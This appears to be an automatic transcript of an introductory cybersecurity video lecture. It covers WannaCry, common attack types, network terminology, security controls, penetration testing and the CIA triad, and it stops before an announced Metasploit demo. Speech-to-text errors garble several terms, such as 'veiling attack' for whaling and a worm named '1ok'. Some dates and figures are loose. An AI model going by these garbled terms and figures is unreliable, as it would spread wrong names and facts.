hi good morning my name is Biffen
Kulkarni and welcome back to the
cybersecurity series of videos in this
video we are going to look at a tutorial
we got an interesting lineup for this
video here we are going to discuss about
the rise of cyber crimes by giving
examples we are going to look at various
scenarios where organizations have faced
cyber crimes in the recent past the
different types of cyber attacks the
reasons for these cyber attacks and then
you are going to dwell into what exactly
cyber security what is expected out of
us as cyber security experts to provide
as a cybersecurity solution then we are
going to look at some basic network
terminologies which will help us
understand cyber security and some of
the terms that are utilized by experts
when we deal with cyber security the
goals that we want to achieve when I say
I want to be secure what exactly do I
mean when I want to secure an
organization what kind of security
parameters are we looking at then we are
going to look at different ways of
tackling cybercrime in today's world and
lastly we've got a very interesting demo
on Metasploit where we are going to test
a vulnerable machine and try to hack it
how Metasploit is penetration testing
tool widely used by security experts and
hackers to test and try to penetrate
different systems so we have a very good
demo on that and we'll be looking at
that at the end of this particular video
let's begin with the rise in cyber
crimes so let's talk about wanna cry
this is something that happened way back
in 2017 let's not say way back it's just
2019 two years back and it took the
world by storm so it was a cyber attack
which encrypted the data of
organizations and then the hikers held
that organization ransom by asking of
rather demanding money from them to
decrypt their own data so what exactly
happened the attack originated in Asia
and then spread across the rest of the
world note the date and how did this
happen there was a vulnerability that
was identified in Microsoft Windows the
SMB vulnerability SMB which is server
message block is essentially the file
sharing and the printer sharing services
that you use in a LAN environment on
Windows operating system by default
these are enabled on your desktop
and there is a hardening guide that
people utilize to either upgrade the
version of SMB to a more secure version
or disable SMB and utilize something
else now this was a known vulnerability
and this was targeted within days more
than 230,000 computers when infected
across a 150 countries now when we say
this was identified Microsoft knew of
this vulnerability and in fact they had
released a patch in April of 2017 to
mitigate this vulnerability within two
months of that release this attack had
happened now in a real world scenario it
is not possible for all the servers and
devices to be upgraded to the latest
patch level because organizations need
to test those patches to see if those
patches are going to interfere with the
services that they are providing and
hence no organization will be completely
patched up at any point in time and this
was the flaw that sadly took down a lot
of organizations the patch was available
but it wasn't testing some we're not
utilizing it yet and they did not see it
as a high-value risk and suddenly
something happened and wanna cry took
place now what happened was a crypto
worm called 1ok which basically encrypts
the data and locks the user out of their
own computers and they get the screen in
front of them which says you've data has
been encrypted and it gives them a link
and they are they demand 300 to 600
dollars to be paid to the hackers to
retrieve the decryption key for their
data now here obviously you're not going
to pay cash to hackers neither are you
going to make a bank transfer because
both of the ways you can identify the
hackers and then pursue them so the
hackers demanded this exchange wire
bitcoins cryptocurrency this is the best
way to remain anonymous and the best way
to make payments over the Internet
without being identified so what was the
impact of the attack around 200,000 to
300,000 computers were infected now it
sounds like a small number of computers
when you are talking about global
however the services that it affected
very huge in UK the National Health
Service but affected all the databases
got encrypted surgeries and frequents of
patients were postponed
FedEx renault-nissan all of these
organizations got compromised and the
production lines basically shut down for
a few days till they retrieved data from
backup started to restore
and then tried to bring back everything
to normal then in February 2000 nineteen
Dunkin Donuts announced that the users
of the reward programs were targeted by
a credential surfing attack that means
that the attacker stole the credentials
usernames and passwords of customers of
Dunkin Donuts
now we think Dunkin Donuts they sell
Donuts how much could it impact anyone
but if you have an online account with
Dunkin Donuts you also have your
personal identifiable information stored
in those accounts for example your name
address credit card information maybe
your social security number or your
national insurance card or something
like that which can lead to identity
theft people can misuse that information
pretend to be you and then take out
loans or do transactions you in your
name where you are going to end up
paying those bills so stealing of such
kind of data is going to impact all the
users adversely so the first name last
name and email ids were stolen that is
still good enough to launch social
engineering attacks and target these
victims are - phishing attacks or
similar attacks so now let's look at the
different types of attacks in cyber so
you're going to discuss these six
malware we are going to talk about
social engineering attacks
man-in-the-middle attacks denial of
service sequel injections and password
attacks if you look at this manifest
basically target hosts operating systems
social engineering attacks would address
or attack the gullibility of a human
being with the help of a computer for
example sending a fake mail or hosting a
fake website man-in-the-middle attack
would target a network and then try to
capture data packets within the network
thus compromising your credentials a
denial of service attack would crash a
service sequel injection attacks would
attack an application and a password
attack would attack the usernames and
passwords of accounts thus taking
advantage of weak passwords and getting
access to your accounts so let's start
with malware malware basically refers to
malicious software the first part of
malicious Mal and the we're out of
software becomes malware malware are
nothing but vehicles in which hackers
embed payloads payloads could be viruses
worms ransomware stro jhin's
so they hide these kind of malicious
software within legitimate looking
softwares and
pose them on the Internet people who are
interested in those kind of software's
will obviously download them and since
they are looking very legitimate they
will try to install them does
accidentally and unknowingly installing
a Trojan virus or a ransomware on their
machine now most of us have done this at
one point in time where we have looked
at pirated software because we did not
want to pay for it and then we probably
go to torrents and then search for those
software's download them and there's a
key gen dot exe over there which we have
to execute and then if you have to copy
that code the Exe file that comes out or
the keygen and then you have to replace
it and I mean it's a very convoluted
process but the fact that you have to
restore some code with some other code
would basically mean that there is
something wrong with that file so 99% of
the time these programs would have
viruses or Trojans embedded within them
and it is going to affect the security
posture of your computers if you scan a
gender DX's with any antivirus across
the globe they will always report them
as malware and they will probably want
to delete those kind of files so how do
we use scan infected it gets infected
into a system that the user clicks on a
suspicious link now obviously if you
think it is a suspicious link you're not
going to click on it but you trust the
link or you're compelled to click on it
just out of curiosity let's say you
click on that link there's a redirector
it downloads an attachment from a
malicious server and it gets installed
on your machine most of the common ways
a virus or a worm is spread is through
USB devices people pass around USB
devices like nobody's business
and you've no idea where that device has
been used before and you plug into your
machine and if there is a virus on that
USB device it will get infected on your
machine as well then let's talk about
social engineering attack now this is
where your people skills come into the
picture this is the art of manipulating
people
and convincing them to give up
confidential information either
knowingly or unknowingly so most likely
well we trust our friends right and we
talk to them a lot and we give out some
confidential information which we would
not give out to others what if somebody
is pretending to be our friend just to
get this information out of us and we
trust this person we give out that
information
and we certainly get affected because of
that
I'm not saying that everybody in the
world does that but it is one of the
most common attacks that is experienced
in the computing world now social
engineering attacks can be broken down
into three categories
first is a phishing attack don't worry
about that figure over there you're
actually not going to go fishing
it's but basically but known as a
phishing attack then there is a spear
phishing attack and then there's a
veiling attack all of these are types of
social engineering attacks where you of
where you're targeting a user by sending
out fake mails or fake websites and
their gullibility into clicking on those
links and then giving out information so
what is a phishing attack it is a
practice wherein a hacker usually sends
fake meals which look really genuine or
hosts fake websites which also look
genuine and looks like they're from a
trusted source once you click on those
links there would be embedded scripts or
embedded malware which would then be
executed and and then get installed on
your machines compromising the security
of your device these utilities could be
used to steal your credit card
information
steal data from your computer upload
data to your computer use your computer
as a bot and anything and everything
that the hacker might want to do spear
phishing is a variation of phishing now
phishing is a non targeted attack it is
to the whole world at large whoever
becomes a victim becomes a victim
however spearfishing is a targeted
attack it is to a specific individual or
to a group of individuals in an
organization so it becomes a customized
attack you identify the victim you
identify the flaws that are existing
over there in the organization you
identify the gullibility of the victim
create that fake meal to suit that
particular situation send it across to
them they'll click on that link and get
infected by whatever payloads that you
have embedded within it whaling is when
you are targeting particularly wealthy
or powerful people in the industry so
normally when you're targeting CEO CFO's
high-level management people of an
organization it would be known as a
veiling attack then we come to the
network attacks man-in-the-middle this
is also known as an eavesdropping attack
which literally means that you are going
to listen in on two somebodies
conversation for example in the figure
the client is trying to talk to the
server but you become a man in the
middle and you try to listen in on the
conversation
that is going on now obviously the
conversation over here may not be audio
but with data that is being exchanged
between the server and the client you
just listen in you make a copy of that
data you store it at your end the data
could contain usernames passwords may
containing confidential information and
help you compromise data the attacking
computer takes the IP address of the
client so you find out the IP address of
the client the client is not aware of
how about this the client is trying to
communicate with the server you spoof
yourself as a default gateway or a
trusted device and the client thinks
that it is through you that they need to
communicate to the server and thus they
start sending data via your PC so this
attack normally happens on public Wi-Fi
networks I've seen that happening a lot
and thus I never recommend anyone using
those public Wi-Fi so for example you go
to a coffee shop they have free Wi-Fi
over there you connect to it and you
start surfing you start browsing you are
always signed into Google Facebook
accounts your bank accounts and whatnot
and then there's a sniffer there is a
hacker who's doing a man-in-the-middle
attack capturing all that data now it's
not an easy attack but it can be done so
this diagram shows where the
man-in-the-middle attack has become
successful and now that the client and
the server both are sending information
why are the attacker without knowing
them knowing that the attacker is
capturing all that data then comes the
denial of service attack the motive in a
DOS attack is not to benefit monetarily
but to bring down a service for
legitimate users that is just causing
harm to the organization for example if
I consume the bandwidth off to a
particular website since there is no
more bandwidth left other legitimate
users who want to interact with the
website will not be able to connect to
the website thus creating a denial of
service to those legitimate users now it
may not be possible for me to use my
laptop to target a cluster of servers
because obviously the bandwidth at the
other end would be very high so I would
distribute my attack across multiple
devices thus creating a distributed
denial-of-service also called a DDoS
attack then we come to the sequel
injection or SQL SQL stands for
structured query language which is the
de-facto language that is used by
applications to interact with databases
so let it be a Microsoft sequel database
my
sequel database Oracle sequel the syntax
may be a little bit different but it is
still the structured query language that
applications utilize to interact with
the database now the queries that are
created by the applications need to be
sanitized at the application level
itself so developers need to be very
careful of how they are going to create
those queries what queries are allowed
to go to the database because the
database is designed to answer queries
it doesn't know what is a legitimate
query and what is a legitimate query if
it receives a query it is going to try
to execute it and give out information
thus a hacker may insert malicious
queries or malformed queries into a
sequel server through the vulnerable
application causing a security event so
depending on the queries that have been
created the attacker could delete some
data or modify data add data edit it or
do anything that has managers in nature
that would compromise the integrity and
the security of that database for
example the Dunkin Donuts right except
apart from being a credential attack
since they got access to the database
they could have added or deleted any
information about any users that were
there then we come to the most common
attacks password attacks this is the
easiest way to hack into a system by
cracking a password of a user this is
done in multiple ways so there would be
a brute force attack where you try every
corportation in combination out of the
alphabet or the character set that is
allowed to be utilized to create
passwords for example we have password
policies write alphabet in uppercase and
lowercase so a through Z capitals and in
lowercase 0 through 9 for numerous and
alphanumeric characters or special
characters like exclamation marks
percentile stars ampersands etc so we
are normally encouraged to create a
randomized password with all of these
utilize in a randomized manner should
not be based on a dictionary word should
not be our names or our phone numbers or
phone numbers in Reverse so why are
these policies created these policies
are essentially created to create a
password that is difficult to crack even
by a brute-force attack so if you've got
a lengthy password which is very
randomized and interest with numerix
alpha numerics special characters and
whatnot it would be very difficult now
this attack is
100% successful that being said the time
it may consume and the compute level
that it may consume
may make this attacker redundant for
example a 16 character password which is
hashed using sha-256 would take around
10 raise to 18 years to be cracked by a
single PC now imagine the amount of time
that takes so it is 100% successful but
the time it takes me make it redundant a
dictionary attack is very accreting a
file which will have a list of all the
common passwords that are utilized by
users so instead of the permutations and
combinations of all the alphabets or all
the characters you're just creating a
list of all the probable passwords that
may be utilized and then you're
comparing those passwords to see if
those passwords match so these kind of
attacks are effective against users who
use very commonly used passwords
dictionary based words as their
passwords now let's talk about the types
of network attacks an active attack is
an attack when the intruder attempts to
disrupt an it networks normalcy and
modifies the data and alters the data at
the same time so as we can see in the
diagram there's a sender and there is a
receiver attacker is the man in the
middle who was now trying to create the
active attack so when the sender sends
that data to the receiver the attacker
intercepts that data modifies the data
and then sends the modified data to the
receiver
since the attackers is a
man-in-the-middle as we have seen in the
previous attacks the receiver neither
the sender would be aware of the
attacker and thus they would not be
aware of the modification that has been
done in a passive attack the intruder
just eavesdrop on the data they just
listen in on to the conversation but
they do not modify the data at any time
so they just capture the packets they
copy the contents so that they can use
that at a later stage so we have seen
all of these attacks so far but what is
the motivation behind them why would
anyone want to create these attacks and
for what particular reasons so let's
talk about the reasons for cyber attacks
now let's start off with cyber terrorism
it is an attack carried out by a group
of terrorists against nations to fulfill
their agendas networks in computers are
attack crucial infrastructure often of a
company would be compromised
thus crippling their infrastructure
and then the terrorists would take
advantage and demand ransom or whatever
their cause is then cyber warfare
nations hack into another nations
Network to cause damage by doing so
critical de dice to learn and in trance
actor can also be hampered now this is
where espionage happens countries are
known to spy on each other especially
their enemies and and enemy at any point
in time would want to know what the
other nations are doing so earlier on we
used to look at spy movies where we used
to plant spies and send spies across the
borders across the lands and try to spy
on them now we can do that sitting at
home or rather we can do that through
our computers and this is exactly what
cyber warfare is cyber espionage here a
technology used to gain information
without the consent from its owner now
this can be in a political situation or
in a corporate situation where a
computer is trying to spy on their other
vendors and trying to figure out how
their business models are more
successful or what their business
strategies are so that these guys can
keep a step or two ahead of their
competitors and the most common of all
personal differences somebody hates
somebody and they want to exact revenge
and that is why cyber attacks can take
place as well so this is why we want
cyber security cyber security should be
in place to prevent these kind of
attacks so what exactly is cyber
security it refers to the practice of
protecting networks programs computer
systems and their components from
unauthorized digital axis and attacks so
whatever your digital footprint could it
be servers computer switches routers web
servers web applications that you are
hosting you over there services that you
are consuming from the cloud or
providing to other customers you need to
secure all of these to ensure that the
integrity and the confidentiality of
these services is intact and none of
these services are affected by any cyber
attacks which could lead to disastrous
results so the main difference we want
to understand here is the difference
between cyber security and information
security information security is data
within the organization where they
handle sensitive information or
proprietary information copyrighted or
printed information and they want to
secure it from data leaks or having the
data in somebody computers
hands cybersecurity is basically a
technique used to protect the integrity
of network so this is when you're going
to go on the web and on the Internet
you're going to secure your devices that
you have deployed allowing people to
access your infrastructure from the
outside so what could be the cost of not
being cyber secure if you get hacked or
if your data is compromised or if your
information is compromised you could
have a lot of repercussions your good
will be go for a toss you may be open
for lawsuits not only from clients but
from customers as well you could be open
for fines or penalties from government
organizations for failing to follow the
law of the land customer trust will
obviously be hampered if you have been
hacked and your data has been
compromised you wouldn't want to deal
with that organization in the future all
of this could land the organization in a
financial crisis where all the lawsuits
and penalties that are being imposed
could basically bankrupt that
organization and does take it out of
circulation so now let's look at some
basic terminologies which we need to
understand to go further in the
cybersecurity world first and foremost
network what is the network network is
nothing but a group of interconnected
devices could be servers could be
workstations could be laptops could be
any devices file printers and whatnot to
be interconnected with each other as you
can see in the net in the diagram it is
used for communications it's used
primarily used for data transmissions
but and to communicate between various
terminals so that the business can go on
it is also used to share data
information it could be wired or
Wireless so you've got a wired LAN or at
home we all have wireless networks where
we connect all our devices we use them
for streaming videos we use them to
connect to the internet so websites work
from home so your office also set up on
our Wi-Fi so a network is nothing but a
collection of interconnected devices
that are allowed to communicate each
other freely so that the business can be
continued in a proper manner server the
server is nothing but a hardware device
that is supposed to handle requests of
data information allowed network
services to function from other
computers and devices so this is where
we build a client-server relationship
where on the server view got
you got the major software we got the
teeth you got the data that is stored
over there and clients and interact with
the server to consume that data in a
particular manner that would help them
make sense and analyze that data and
generate business out of them then the
internet Internet is nothing but the
collection of multiple networks globally
so all the networks that we have across
the globe when they are interconnected
with each other that is what internet is
and if you just go back and you talk
about servers this is what allows the
internet to be formed so every
organization's when they publish their
servers on the internet and they allow
everyone to interconnect through those
servers that is where the internet comes
in be the servers being the backbone of
the internet obviously for the servers
to communicate with each others we will
need switches routers and other devices
for the data transmissions to happen so
these are the multiple networks could be
individual networks internet
interconnected together would form the
internet across the globe for the
internet to work there would be a set of
protocols for transmissions to be
allowed across the globe now this is
where tcp/ip or the transmission control
protocol over Internet Protocol comes
into the picture so if you remember we
use communication channels like TCP or
the transmission control protocol and
UDP user Datagram protocol when we
connected connect to web servers we
talked about the HTTP protocol and HTTP
protocol if you want it secure then
we'll talk about IMAP pop3 and all of
these protocols now where do these
protocols come from it is nothing but a
suite of the tcp/ip software which
contains all of these protocols which
allow computers to communicate with each
other
if tcp/ip wouldn't have been there our
network would have collapsed now when we
have tcp/ip and we want to communicate
across the globe how do we identify
devices on the internet or even on the
internet because the devices don't know
us they are not going to use our
usernames and passwords to communicate
with each other but when I want to
connect to a website or a device how do
I identify it on the intranet or the
Internet I obviously use IP addresses
now IP addresses are nothing but the
Internet Protocol addresses which are
32-bit addresses which look exactly like
the one shown on your screen 172 dot 16
or 250 4.1 now there is a lot of
classification of IP addresses and
some of these IP addresses work on the
Internet some of them are supposed to
work on private lands but will reserve
that for a later topic then the second
way that we are identified on the
internet or the Internet are with MAC
addresses so media access controls or
MAC addresses are hard coded addresses
at given to our network interface cards
these cannot be modified physically at
any point in time however there are
techniques to spoof MAC addresses which
we can then obfuscate our existing
address and give us a new one that would
again be discussed in a later in a later
lecture a router
you've been talking about routers and
switches router is nothing but a device
that passes packets back and forth
across networks it routes the data in
the appropriate path so it is an
intelligent device it can understand IP
addresses and MAC addresses it can
identify different paths of reaching a
particular network for example if I'm
sitting in India and I want to
communicate across the world to America
there would be a specific path that
needs to be followed for my data packet
to reach the other side of the world it
is the routers that would map this park
store it in their cachet so when I try
to connect to that server they would
retrieve it from the cache and send the
packet across the globe so the home
router as we use at home on Wi-Fi is our
default gateway to connect to the
internet and thus it allows our internal
devices to communicate with each other
within using internal IP addresses and
when we want to go to the internet it
will then route the profit on the
internet and send the packet to other
servers that we want to communicate with
now what is a domain a domain is
referred to as a group of computers and
other devices that are interconnected
and treated as a whole now a domain U is
used by an organization so let's say if
I am X Y Z X Y Z being the name of the
organization and I want to create an a
domain which would allow me to create a
group of interconnected computers for my
employees to interconnect with each
other and send and manage data I am
going to create a domain for my
organization and attach all the devices
create users and interconnect them using
a domain so this is where you are going
to have a centralized approach of a
server client relationship where you are
going to have a main domain and you're
going
to have devices connected to the doming
now when we go onto the internet the
domain-name is nothing but the base part
of a website name so when you say
google.com and you type it in your
browser you're taken to the web page
called google.com which is the search
engine that you're connected but for
Google the organization at the other end
they would have a data center over there
which would have all that relevant data
which allows you to search through that
information so for them the domain would
be the internal part where what this
cluster of servers creating a data
center where all that information is
stored but for us as consumers a website
called google.com would be a domain for
us to visit that particular website and
consume the services that they're
offering on the Internet so here the
example is HTTPS which means that it is
a secure website port 443 and we're
connecting to cyber security comm cyber
security comm becomes the domain name
HTTPS becomes the protocol that we want
to utilize to connect to that particular
website then we come across DNS or the
domain name system it is nothing but an
index something like a phone book which
is responsible for mapping the domain
name into its corresponding IP address
now remember I said that there are only
two ways Vee identified on the internet
or the Internet either the IP address or
the MAC address if it is devices if it
is computers we're talking to each other
it would obviously be IP addresses but
if I type in google.com I'm giving it a
domain name the Internet does not
understand to me memes so there is a DNS
a server which is an index or works like
an index or mooring a phonebook which
will have a list of all the domains with
the corresponding IP addresses so
whenever I type in google.com the
request goes to a DNS server the DNS
server is queried the IP address of
google.com is identified paste it onto
the packet and then the packet is routed
through the router to the path that it
has in mind to reach the google.com
server here
replace google.com with cyber security
dot-com so as you can see on the screen
the local PC queries the DNS server the
DNS server replies back with the IP
address now if you're wondering how does
this work if we will take an example of
home networks the ISP door the internet
service provider gives us a default
gateway or a router with their own IP
addresses for DNS servers and default
gateways so
when we try to connect to the router the
router has the IP another DNS server and
it routes that query to the DNS server
the DNS server replies back with the
appropriate IP address the router then
takes that IP address figures out the
path and sends it across to the targeted
server DHCP or the dynamic host
configuration protocol it is a protocol
that dynamically assigns IP addresses to
the devices in the network so we have
discussed that IP addresses are required
by computers to communicate within each
other but who associates or who gives
these IP addresses to these computers so
for that to happen we have got a DHCP
server that is created if you take your
home networks it is the router that has
the DHCP rule installed on it so
whenever machine boots up it sends out a
broadcast request looking for the DHCP
server and then there is a communication
with the DHCP server the DHCP server
then allocates an IP address to the
computer who is requesting it and once
the IP address is allocated on entries
when in the DHCP servers cache a with
the corresponding MAC address of that
particular machine then we come to the
next stop topic called VPN or a virtual
private network it is a connection
between a VPN server and a VPN client
it's basically encrypted channel that
you're creating between two endpoints
and the main reason for a VPN is to
encrypt your data so that it is now no
longer subject to man in the middle or
eavesdropping or modification attacks so
this is a layer of security that you are
adding when you are connecting to the
internet using an encrypted channel
which would prevent you from getting
hacked or your data being compromised by
hackers so as you can see here and if
you remember the previous talk previous
slides that we have seen the hacker was
able to copy the data very easily now
that it is an encrypted channel even if
the hacker tries to eavesdrop and
capture the data it will be formatted in
such a way that they would not be able
to make sense out of it now the attacker
or the hacker will try will have to try
to decrypt the data so that's another
attack that they'd have to execute to
find out the encryption key decrypt the
data and then look at what the data was
then we come across spotting it now
first let's first understand what bots
are bots are nothing but the software's
that can be installed on vulnerable
machines that would allow the hacker to
send commands to the infect
machines to generate some traffic or to
do what the command tells him to do so
most of the botnets are used for
distributed denial of service attack if
you remember the DOS and DDoS that we
discussed a while back this is where we
tied up with how they are executed so a
bot master or a hacker that's called the
hacker would try to identify vulnerable
devices across the internet and try to
install the pot onto those devices the
Bata Sencha Lee is a software that would
revert back to the bot master and
advertise their availability whenever
they have been powered on a collection
of such infected devices would
essentially be called a botnet when
there are enough number of machines that
the attacker fill feels good enough to
launch that attack on the targeted
servers the hacker will then initiate
those devices send the commands through
the bot master to the bots and the bots
would then generate that kind of traffic
but whatever they have been configured
for and then attack the targeted server
now this is also done to optimize the
identity of the hacker since the attack
is being generated through the botnet
the IP addresses of the botnet computers
would be reported to the targeted so not
the actual hackers IP address so it to
figure out who the attacker was would be
very much difficult depending on the
size of the botnet so this you can see
is the attack that has been created over
the victims and the malicious traffic
has been generated through the botnet
and the victims have been targeted
through that so I said once that traffic
has been done to forensically
investigate at the victims end they
would find the IP addresses of the
botnet and not the attacker all right
let's start talking about network
security controls network security
controls are nothing but implementations
of various devices to enhance the
security of a particular network these
could be firewalls intrusion detection
systems or intrusion prevention systems
honeypot unified threat management
systems and so on so forth the next-gen
firewalls that we talk about right so
let's look at a review of what these
devices are now a firewall can be a
hardware or a software that is
responsible for allowing or disallowing
a certain amount of traffic to or from
your computer so these are basically
created to enhance the security posture
of your network where you can configure
for certain level of traffic to be
allowed awesome traffic to be disallowed
now a firewall is not going to decide by
itself what is a good amount of traffic
or what is bad traffic you're going to
configure the firewall by creating rules
based on IP addresses port numbers
protocols and what me and based on this
the firewall will then analyze the
traffic coming in or going out to the
inbound Autobahn rules and if the
traffic is allowed it will allow the
traffic to go through if there's a
explicit rule which says deny the
traffic it will drop the packets or it
will delete the packets it will not
allow the packets to go past it so if it
is good traffic that means it matches a
rule that has been created that allows
the traffic to go through the firewall
will allow it if it's bad traffic that
means that there is a rule which denies
that traffic to pass through it will get
blocked at the firewall level itself it
will the firewall will not allow it to
enter the network similarly an intrusion
detection system it is designed to
detect unauthorized access to systems or
intrusion attempts as well now it works
along with the firewall and the main
thing is that here there's a data base
against which it can compare the traffic
so most of the attacks that we've talked
about there are some distinct signatures
that would cause concern or that would
highlight that kind of an attack most of
the organizations try to develop these
kind of signatures have them in a
database and store them on the ideas so
that ideas can analyze the incoming
traffic look at patterns from the
traffic coming in or going out compare
it to the database of the signatures
that it has and if it matches any of the
signatures it will then detect that as
an attack and send an alert to the
administrator with administratively then
have to manually come in and check it
out an intrusion prevention system as
described earlier or as mentioned
earlier can be configured to react to
that particular event so if it detects
something that can be classified as an
intrusion an administrator can pre
configure it to react to that particular
packet in a particular manner for
example drop the packets or reflect them
to a honeypot or one the administrator
or do all of these things at the same
time so as you can see on the diagram
and the
there's a hacker a sense of data packets
come in the firewall is not able to
analyze the traffic because a firewall
cannot analyze the contents of a packet
it can only look at the header it can
only look at the IP addressing and the
ports that are that have been created or
the rules on which those things have
been mentioned and then it allows the
data to go through
it reaches the ideas the ideas then
looks at two ways to scan one is a
signature that we've just spoken about
where the developer of the IDS creates
those signatures and stores them onto
the reader base or another thing that is
known as heuristic scanning which is
nothing but behavioral scanning so it
looks at the behavior of the data and if
the behavior looks malicious it will
then raise an alert and warn the
administrator then let's come to honey
pots we just discussed in the previous
slide that an IPS or an intrusion
prevention system can be pre-configured
that if it detects and animal e or if it
detects an intrusion it may redirect a
traffic to a honeypot what is a honeypot
a honeypot is a decoy system it is
created to showcase a certain set of
vulnerabilities to try to attract the
attention of a attacker now the word
here is used as lure but it's more to
deceive that occur for example if the
attacker has been able to bypass your
firewall and your ideas and now can scan
the entire subnet when they scan it they
would come across a device which is
pretty vulnerable or showcases some
vulnerabilities which would definitely
impress the hacker because they would
think that it is a vulnerable server
which contains some valuable data and
that exactly what honeypot is it's a
decoy server trying to trying to act as
a production server trying to showcase
that it has some valuable data but also
has some vulnerabilities in it so that
the attacker can be attracted towards it
and spend some time trying to attack it
or analyze the honeypot at the same time
the honeypot will analyze the data
traffic and it will warn the
administrator of a possible intrusion
which will give the administrator enough
time to secure the rest of the network
and will also get to analyze the logs of
the honeypot one to try to understand
what kind of attacks that occur is
trying to create and try to
reverse-engineer and identify the
attacker at the same time let's talk
security testing security testing is
nothing but a method we just carried out
to identify threats and loopholes in a
system so here we are going to do a
vulnerability analyst and penetration
test we may also go ahead and do a
security audit so what is vulnerability
scanning penetration testing and
security auditing vulnerability scanning
is the activity which you are conducting
to identify or look at possible
weaknesses or issues or vulnerabilities
or miss configurations that exist in
your infrastructure so it is a proactive
way where our team of security experts
will launch a vulnerability scanner scan
certain devices that they have pre
identified and once the report from the
vulnerability scanner comes in try to
analyze the report and make sense out of
it to see if there are any
vulnerabilities that can be identified
on those devices this is obviously an
ongoing process white because operating
systems are patched upgraded new
versions of software's are released and
we keep on upgrading and we keep on
changing our IT infrastructure ever so
often and hence the IT infrastructure
like sa is an ever-evolving process and
to be a breach of all the latest
vulnerabilities and threats we need to
do the vulnerability analysis in an
ongoing manner to identify possible
threats to the organization so then what
is penetration testing vulnerability
analysis is just identifying the
vulnerabilities gaps misconfigurations
that may be in the organization's
infrastructure a penetration test is
basically to validate whether those
vulnerabilities that have been reported
are real if yes how complex are they
what would be the impact and what will
be the technological impact and what
kind of data would be compromised or
what would be the end result of that
attack if it actually happens in the
real world so here a bunch of ethical
hackers would simulate an attack from a
hackers perspective or from an insider's
perspective a malicious outsider or a
malicious insider depending on how they
perceive the vulnerability as and then
they will try to test the word already
to see how it can be exploited to what
extent it can be exploited and what
could be the compromise on what would be
the data leakage that would happen if
this vulnerability gets exploited so
there are three ways a penetration test
can be conducted
there is a black box testing a grey box
testing and a white box testing if you
look at black box testing this is where
the tester or the penetration tester
rather has no knowledge about the
organization their infrastructure
applications or anything so this is
where you're simulating a hacker who's
sitting on the outside who has no
knowledge about the organization so they
start from the information gathering
phase where they are going to try to
figure out the IP addresses the IP
ranges devices operating systems
applications and anything and everything
that the organization is going to use
and then try to figure out whenever it
is within them and then try to attack
those vulnerabilities this is a very
time-consuming and cost consuming audit
the second one is a grey box testing
audit where a partial knowledge is given
to the penetration tester so this
simulates a regular user kind of an
attack so let's say if I'm a regular
user in an organization and by when I
say regular user I am saying I'm not an
administrator so I have got limited
access and based on that limited access
and the limited knowledge that I can
gather about the infrastructure by being
a regular employee we are going to
simulate a test with that knowledge to
see whether employee can take this
advantage of any vulnerabilities or and
then try to worm their way into the
organization's infrastructure and Hacket
the white box testing on the other hand
is where if you're looking at an insider
a malicious insider who already has all
the accesses who already has all the
controls in his hand so Samuel eating
and administrative access and then
trying to figure out whether this
administrator can escalate their
privileges and gain some other
administrators access and try to then
compromised data for example even if I
am saying I'm an administrator I am NOT
the only administrator in the
organization they would be backup
administrators there would be system
administrators there would be the active
directory administrators there would be
application administrators database
administrators and so on so forth so
every single component that we have may
have a different administrator for
example switches would have a different
admin straighter same thing with
firewalls or any other security controls
that you have so if I am a administrator
for backup can I then try to worm my way
out escalate my privileges
as a regular administrator or a system
administrator and then crack their
passwords try to get access and
manipulate some data so these are the
three types of penetration testing
audits that you will come across there
would be some different subtypes but
every organization can customize these
kind of audits to whatever they require
then we come to security auditing
security auditing is nothing but an
internal check that is carried out by
internal auditors that means people who
are employees within the organization to
find out flaws in the organization's
information system now this is more on
the compliance side this may take inputs
from the vulnerability assessment and
the penetration test but overall we want
to see what kind of policies that we
have in our organization whether those
policies are working properly whether
they make sense
are there any gaps and based on the
technical inputs from the VAP D team how
do we map with the policies that we have
defined for that organization for
example a password policy now we have
documented that a password policy should
be effective enough that passwords
cannot be easily brute forced so that's
the high level policy then we dictate a
procedure for that policy to be
implemented where we say hey we want the
systems to be configured where the
password meets some complexity standards
for example should be uppercase and
lowercase a through Z zero through nine
should use special characters and should
be randomized password should not be
dictionary based or based on the user's
name now these are this is the policy
that we have created and the procedures
that we have defined
are they being actually implemented in
the real world so a vulnerability
analysis would determine whether the
passwords are probably weak or not so if
the vulnerability report comes back and
says the passwords are probably weak
then a penetration tester would go in
and then try various attacks to see if
passwords can be compromised and if yes
they would then look at the complexity
of the passwords compared to the
procedures and the policies and if they
do not match that's where your security
auditing comes into the picture
so you're basically tying up the policy
the procedures and the actual
implementation that you have created in
an organization let's talk about cyber
security goals CIA and we are not
talking about the Central Intelligence
Agency here you're talking about the CIA
tree our triad which is confidentiality
integrity and availability
this becomes the baseline for
every security professional at any point
in time it is the c.i.a that we are
trying to implement in an organization
to assure that our information security
is at a very acceptable level now what
is confidentiality integrity and
availability confidentiality is the
aspect where we can manipulate the data
or we can configure a data data to be
accessible only to authorized people
only now when we say authorized you
basically are creating rules and
responsibilities over here where I have
to authorize some people access and not
authorize some people not to access a
certain amount of data right for example
if you have stored a data on a central
store like let's say everybody has a
Dropbox or a onedrive right and how do
you protect your Dropbox or onedrive you
have a username and password you may
announce it by using a one-time password
or multi-factor authentication to access
the onedrive right now that is where
confidentiality comes in where you're
going to protect the data in such a way
that it cannot be accessed by
unauthorized users so the first thing
that you want to look at is how do you
manage authorization the second aspect
and we'll come back to confidentiality
in a bit the second aspect is integrity
that is the trustworthiness of that data
now if we are talking about the data
that is stored on your onedrive and we
are keeping it confidential by giving it
an authentication mechanism here you
have to identify by using your username
then you have to give a password and
then OTP is either emailed or sent to
your mobile phone right and then you
type in that OTP and then you access
that data
now when you accessing that data how can
you be sure that that data has not been
modified by a hacker somebody may have
gotten their hands on your password they
logged in and they access that data they
modified it and that data is no longer
trustworthy so how do you maintain the
integrity the trustworthiness of that
data so here we use hashing algorithms
where we take hash values of certain
files and ensure that the integrity of
that data is assured now probably in
that demo I can show you what hashing is
and I'll give you a couple of examples
of how hashing can be utilized for
integrity management and then the third
aspect is availability now the best way
I can make my data confidential and
trustworthy is I can lock it up in a
safe take it to the ocean drop it in at
bottom of the ocean and nobody can
access it but the data that is not
accessible by anyone or any authorized
person when they require it has no value
so for the data to be valuable for me I
need to have access to that data
whenever I require it I being that
authorized person right so when we want
to look at this we are basically
juggling along this triangle where we
want to keep the security in such a way
where the data is confidential it's
trustworthy and at the same time it is
highly available to all the authorized
users as and when they want it now when
we implement this there would be other
scenarios or other concepts that would
come into the picture for example I
Triple E now when we say confidentiality
right and we won't we talked about
authorization so the first thing of
authorization is how do we authorize
